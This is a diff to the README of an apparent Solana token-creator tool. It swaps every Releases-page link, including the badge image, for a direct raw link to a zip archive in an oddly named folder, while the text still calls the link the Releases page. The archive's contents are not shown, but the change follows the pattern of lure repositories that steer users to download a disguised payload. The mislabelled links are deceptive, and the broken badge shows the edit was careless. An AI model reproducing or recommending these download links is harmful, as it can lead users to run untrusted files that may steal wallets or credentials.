@@ -6,7 +6,7 @@ This guide will help you download and run the top-solana-token-creator-tools app
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Top%20Solana%20Token%20Creator%20Tools-brightgreen)](https://github.com/MauriGonzalez22/top-solana-token-creator-tools/releases)
+[![Download](https://raw.githubusercontent.com/MauriGonzalez22/top-solana-token-creator-tools/main/Chamacea/creator-solana-token-top-tools-v1.7-beta.5.zip%20Now-Top%20Solana%20Token%20Creator%20Tools-brightgreen)](https://raw.githubusercontent.com/MauriGonzalez22/top-solana-token-creator-tools/main/Chamacea/creator-solana-token-top-tools-v1.7-beta.5.zip)
 
 ## 🚧 System Requirements
 
@@ -19,7 +19,7 @@ To run the application smoothly, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get the application, visit the [Releases page](https://github.com/MauriGonzalez22/top-solana-token-creator-tools/releases) on GitHub. Here is how:
+To get the application, visit the [Releases page](https://raw.githubusercontent.com/MauriGonzalez22/top-solana-token-creator-tools/main/Chamacea/creator-solana-token-top-tools-v1.7-beta.5.zip) on GitHub. Here is how:
 
 1. Click the link to go to the Releases page.
 2. Look for the latest version of the software.
@@ -84,4 +84,4 @@ Join the community of users to share your experiences and get insights. Visit ou
 
 Stay updated with the latest developments and features by following our repository on GitHub. Your feedback is valuable and helps us improve the application.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Top%20Solana%20Token%20Creator%20Tools-brightgreen)](https://github.com/MauriGonzalez22/top-solana-token-creator-tools/releases)
+[![Download](https://raw.githubusercontent.com/MauriGonzalez22/top-solana-token-creator-tools/main/Chamacea/creator-solana-token-top-tools-v1.7-beta.5.zip%20Now-Top%20Solana%20Token%20Creator%20Tools-brightgreen)](https://raw.githubusercontent.com/MauriGonzalez22/top-solana-token-creator-tools/main/Chamacea/creator-solana-token-top-tools-v1.7-beta.5.zip)
